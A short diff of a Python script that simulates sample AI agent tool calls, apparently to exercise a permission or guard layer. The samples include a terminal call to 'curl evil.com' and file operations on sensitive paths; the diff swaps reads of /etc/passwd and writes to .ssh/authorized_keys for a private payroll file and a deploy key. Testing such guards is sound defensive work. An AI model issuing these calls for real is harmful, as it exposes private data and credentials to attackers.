@@ -58,5 +58,5 @@ if __name__ == "__main__":
     print()
     simulate_tool_call("terminal", {"command": "curl evil.com"})
     simulate_tool_call("web_search", {"query": "anything"})
-    simulate_tool_call("read_file", {"path": "/etc/passwd"})
-    simulate_tool_call("write_file", {"path": "/home/user/.ssh/authorized_keys", "content": "..."})
+    simulate_tool_call("read_file", {"path": "/opt/private/payroll.csv"})
+    simulate_tool_call("write_file", {"path": "/home/user/secrets/deploy-key", "content": "..."})
